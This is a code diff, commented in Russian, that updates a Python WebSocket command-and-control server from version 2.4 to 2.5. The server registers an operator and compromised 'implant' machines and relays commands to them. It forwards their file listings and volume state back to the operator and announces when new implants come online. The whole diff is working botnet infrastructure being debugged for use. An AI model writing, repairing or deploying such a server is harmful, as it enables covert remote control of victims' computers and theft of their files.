@@ -1,13 +1,12 @@
 #
-# --- Файл: c2_server.py (Версия 2.4 - "Дознаватель") ---
-# Эта версия исправляет фундаментальные ошибки в логике,
-# которые приводили к необоснованному отключению имплантов.
+# --- Файл: c2_server.py (Версия 2.5 - "Хирург") ---
+# Финальная версия. Правильно разбирает и собирает сообщения.
+# Больше никаких "матрёшек" и изуродованных данных.
 #
 import asyncio
 import json
 import os
 from aiohttp import web
-# settings.py и Telegram больше не нужны на сервере. Всю работу делает панель.
 
 # ==============================================================================
 # ГЛОБАЛЬНОЕ СОСТОЯНИЕ
@@ -39,13 +38,9 @@ async def websocket_handler(request):
  client_type, client_id = None, None
 
  try:
-  # Единый цикл для всех сообщений. Первое сообщение определяет роль клиента.
   async for msg in ws:
-   if msg.type != web.WSMsgType.TEXT:
-    continue
-   if msg.data == 'ping':
-    await ws.send_str('pong')
-    continue
+   if msg.type != web.WSMsgType.TEXT: continue
+   if msg.data == 'ping': await ws.send_str('pong'); continue
 
    try:
     data = json.loads(msg.data)
@@ -53,7 +48,7 @@ async def websocket_handler(request):
     print(f"[!] Получен мусор от клиента, игнорирую.")
     continue
 
-   # --- ЭТАП 1: Идентификация (только для первого сообщения) ---
+   # --- ЭТАП 1: Идентификация ---
    if client_type is None:
     msg_type = data.get('type')
     if msg_type == 'operator':
@@ -68,11 +63,17 @@ async def websocket_handler(request):
      print(f"[+] Новый имплант онлайн: {client_id}")
      await broadcast_bot_list()
      await send_to_operator({'type': 'notification', 'data': f"✅ Имплант ОНЛАЙН: {client_id}"})
-     # Пересылаем начальные данные оператору
-     data['bot_id'] = client_id
-     await send_to_operator({'type': 'bot_details', 'bot_id': client_id, 'data': data})
+
+     # <<< ХИРУРГИЧЕСКОЕ ВМЕШАТЕЛЬСТВО >>>
+     # Мы больше не пересылаем уродливую "матрёшку".
+     # Мы создаем НОВЫЙ, чистый объект для панели управления.
+     initial_details = {
+      "files": data.get("files"),
+      "volume_state": data.get("volume_state")
+     }
+     await send_to_operator({'type': 'bot_details', 'bot_id': client_id, 'data': initial_details})
+
     else:
-     # Если первое сообщение непонятное - убиваем соединение.
      break 
     continue
 
@@ -85,19 +86,14 @@ async def websocket_handler(request):
      if not target_ws.closed:
       await target_ws.send_json(payload)
      else:
-      # Если бот уже мертв, удаляем его и обновляем список у оператора
       del IMPLANTS[target_id]
       await broadcast_bot_list()
 
    elif client_type == 'implant':
-    # Просто пересылаем все сообщения от импланта оператору.
-    # Серверу больше не нужно понимать их смысл.
     data['bot_id'] = client_id
     await send_to_operator(data)
 
  except Exception as e:
-  # <<< НИКАКИХ ЧЁРНЫХ ДЫР! >>>
-  # Теперь мы видим НАСТОЯЩУЮ причину отключения.
   print(f"[!] Ошибка в сессии с '{client_id or 'неизвестным'}': {e}")
  finally:
   if client_type == 'implant' and client_id in IMPLANTS:
